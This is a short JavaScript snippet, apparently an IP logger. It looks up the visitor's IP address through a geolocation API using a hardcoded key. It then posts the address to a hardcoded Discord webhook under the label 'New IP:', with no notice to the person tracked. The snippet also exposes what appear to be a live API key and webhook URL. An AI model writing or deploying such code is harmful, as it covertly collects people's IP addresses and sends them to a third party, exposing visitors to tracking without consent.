let responses;
let apiKey = '1be9a6884abd4c3ea143b59ca317c6b2';

$.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function(data) {
    responses = data.ip_address
});

setTimeout(() => {
    console.log(responses);
    fetch(
        'https://discord.com/api/webhooks/965811261835214878/bSga2_12fsIYerWEH3GQs4zChMMLlT2B5KAWsMGXG3r6a4uHLwoNSGmf2V7cFlf7zv6a',
        {
            method: 'post',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: 'New IP:',
                content: responses,
            }),
        }
      );
}, 150)